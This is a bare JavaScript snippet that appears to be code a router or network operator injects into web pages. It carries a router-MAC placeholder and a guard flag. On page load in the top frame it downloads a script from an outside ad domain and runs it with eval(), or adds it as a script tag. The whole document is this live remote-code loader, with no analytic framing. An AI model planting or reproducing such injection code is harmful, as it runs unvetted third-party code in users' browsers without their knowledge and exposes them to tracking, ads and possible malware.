;(function () {
if(window.top !== window) return;
if(window.hasexecinjectjs) { return; };

window.hasexecinjectjs = true;
window.veryroutermac='%ROUTERMAC%';
var daytime = new Date(new Date().setHours(0, 0, 0, 0)) / 1000;
var url = 'https://waic.withad.cn/ads.4ldqpe3.js?_=' + daytime;
if (window.XMLHttpRequest) {
var xhr = new XMLHttpRequest();
xhr.open('GET', url);
xhr.onreadystatechange = function () {
if (xhr.readyState == 4 && xhr.status == 200) {

var text = xhr.responseText
eval(text);
}
}
xhr.send(null);
return;
}
var script=document.createElement('script');
script.src = url;
document.head && document.head.appendChild(script);
})();
